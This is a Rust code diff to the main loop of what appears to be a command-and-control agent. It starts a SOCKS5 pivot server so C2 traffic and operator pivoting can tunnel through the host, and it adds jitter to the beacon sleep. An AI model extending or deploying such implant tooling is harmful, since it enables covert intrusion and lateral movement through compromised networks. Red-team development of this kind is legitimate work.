@@ -10,6 +10,8 @@ use tokio::time;
 use rand::Rng;
 use log::{info, warn};
 use networking::socks5_pivot::Socks5PivotHandler;
+use crate::networking::socks5_pivot_server::Socks5PivotServer;
+use std::sync::Arc;
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -19,22 +21,31 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let config = AgentConfig::load()?; // Make sure this returns the right error type
     info!("[CONFIG] Loaded agent config: {:?}", config);
 
+    // Channel for pivot frames
+    let (pivot_tx, mut pivot_rx) = tokio::sync::mpsc::channel(100);
+    let pivot_handler = Arc::new(tokio::sync::Mutex::new(Socks5PivotHandler::new(pivot_tx.clone())));
+
     if config.socks5_enabled {
         info!("[CONFIG] SOCKS5 is enabled. Proxy: 127.0.0.1:{}, all C2 traffic will use SOCKS5 Reverse Proxy tunnel.", config.socks5_port);
-        // Start SOCKS5 server for pivoting (to be implemented)
-        let _socks5_port = config.socks5_port;
+
+        // Start SOCKS5 pivot server for operator-side pivoting
+        let pivot_server = Socks5PivotServer::new(
+            "127.0.0.1".to_string(),
+            config.socks5_port,
+            pivot_tx.clone(),
+        );
+        let pivot_handler_clone = pivot_handler.clone();
+        tokio::spawn(async move {
+            pivot_server.run(pivot_handler_clone).await;
+        });
     } else {
         warn!("[CONFIG] SOCKS5 is disabled. Agent will use direct connection.");
     }
 
-    // Channel for pivot frames
-    let (pivot_tx, mut pivot_rx) = tokio::sync::mpsc::channel(100);
-    let mut pivot_handler = Socks5PivotHandler::new(pivot_tx.clone());
-
     // Spawn pivot frame handler in background
     tokio::spawn(async move {
         while let Some(frame) = pivot_rx.recv().await {
-            pivot_handler.handle_frame(frame).await;
+            pivot_handler.lock().await.handle_frame(frame).await;
         }
     });
 
@@ -54,7 +65,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             time::sleep(Duration::from_secs(5)).await;
         }
         
-        let mut rng = rand::thread_rng();
+        let mut rng = rand::rng();
         let sleep_time = config.sleep_interval + rng.gen_range(0..config.jitter);
         time::sleep(Duration::from_secs(sleep_time)).await;
     }
